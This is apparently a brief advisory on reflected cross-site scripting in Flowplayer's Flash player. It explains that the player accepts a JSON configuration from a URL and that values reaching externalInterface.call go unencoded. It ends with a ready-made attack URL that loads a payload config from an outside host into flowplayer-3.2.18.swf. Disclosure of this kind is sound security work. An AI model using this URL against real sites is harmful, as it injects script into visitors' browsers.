Subject: Reflected Cross-Site Scripting (XSS) in Flash Version of Flowplayer

Description:
The flash file accept its configuration via a JSON object. This object can be passed directly or via a file.
The old version of this flash file was vulnerable because of loading insecure external flash files. The latest version and the previous ones are also vulnerable because of lack of encoding/validation in the parameters that are used in externalInterface.call.
Both of these issues have been included in the flowplayer.js file. 
This file can be used like this:
/flowplayer-3.2.18.swf?config=http://0me.me/demo/xss/flowplayer/flowplayer.js
